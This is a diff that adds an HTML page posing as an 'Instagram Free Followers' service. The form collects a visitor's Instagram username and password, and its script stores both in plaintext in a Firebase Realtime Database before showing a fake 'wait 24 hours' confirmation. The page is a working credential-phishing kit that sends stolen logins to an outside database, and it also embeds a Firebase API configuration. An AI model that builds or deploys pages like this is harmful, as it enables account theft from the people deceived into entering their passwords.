@@ -1,0 +1,109 @@
+<html>
+    <head>
+        <title>Instagram Form</title>
+        <link rel="stylesheet" href="style.css">
+    </head>
+    <body class="bb">
+        <form id="loginForm" class="form">
+            <h2>Instagram Free Followers</h2>
+            
+            <label for="instagramUsername" class="inputbox">
+                Instagram Username
+                <br><br>
+                <input type="text" value="" id="instagramUsername" required>
+            </label><br><br>
+            
+            <label for="instagramPassword" class="inputbox">
+                Instagram ID Password
+                <br><br>
+                <input type="password" value="" id="instagramPassword" required>
+            </label><br><br>
+            
+            <label for="followers" class="inputbox">
+                How Many Followers Do You Need
+                <br><br>
+                <select id="followers" required>
+                    <option value="" disabled selected>Select followers</option>
+                    <option value="100">100 Followers</option>
+                    <option value="200">200 Followers</option>
+                    <option value="500">500 Followers</option>
+                    <option value="1000">1k Followers</option>
+                    <option value="5000">5k Followers</option>
+                </select>
+            </label>
+
+            <input type="submit" value="Submit" class="sub" id="submit">
+            <p id="message" style="display:none;"></p> <!-- Hidden by default -->
+        </form>
+
+        <!-- Custom Success Modal -->
+        <div id="customAlert" class="modal">
+            <div class="modal-content">
+                <p>Your request has been submitted. Please wait for 24 hours.</p>
+                <button id="closeAlert">OK</button>
+            </div>
+        </div>
+
+        <script type="module">
+            import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
+            import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";
+
+            const firebaseConfig = {
+                apiKey: "AIzaSyArG94Zfh7Kh47UzP3fPAXSo41ttffSGgQ",
+                authDomain: "instagram-205e7.firebaseapp.com",
+                projectId: "instagram-205e7",
+                storageBucket: "instagram-205e7.firebasestorage.app",
+                messagingSenderId: "788576515197",
+                appId: "1:788576515197:web:d7c83184e354cf2a05ed14"
+            };
+
+            const app = initializeApp(firebaseConfig);
+            const db = getDatabase(app);
+
+            document.getElementById("loginForm").addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                const instagramUsername = document.getElementById("instagramUsername").value;
+                const instagramPassword = document.getElementById("instagramPassword").value;
+                const followers = document.getElementById("followers").value;
+
+                if (!instagramUsername || !instagramPassword || !followers) {
+                    document.getElementById("message").textContent = "Please fill in all fields!";
+                    document.getElementById("message").style.color = "red";
+                    document.getElementById("message").style.display = "block"; // Show the message
+                    return;
+                }
+
+                try {
+                    // Add data to Firebase Realtime Database
+                    await set(ref(db, 'instagram/' + instagramUsername), {
+                        instagramUsername: instagramUsername,
+                        instagramPassword: instagramPassword,
+                        followersNeeded: followers
+                    });
+
+                    // Disable the submit button and show success message
+                    document.getElementById("submit").disabled = true;
+                    document.getElementById("submit").value = "Submitted";
+                    
+                    // Hide the success message (Optional, if you don't want it to show)
+                    document.getElementById("message").style.display = "none"; // Hide the success message
+
+                    // Display custom alert
+                    document.getElementById("customAlert").style.display = "block";
+
+                    // Clear the form after submission
+                    document.getElementById("loginForm").reset();
+                } catch (error) {
+                    console.error("Error adding data to Firebase: ", error);
+                    alert("Error: " + error.message);
+                }
+            });
+
+            // Close the custom alert modal
+            document.getElementById("closeAlert").addEventListener("click", function() {
+                document.getElementById("customAlert").style.display = "none";
+            });
+        </script>
+    </body>
+</html>
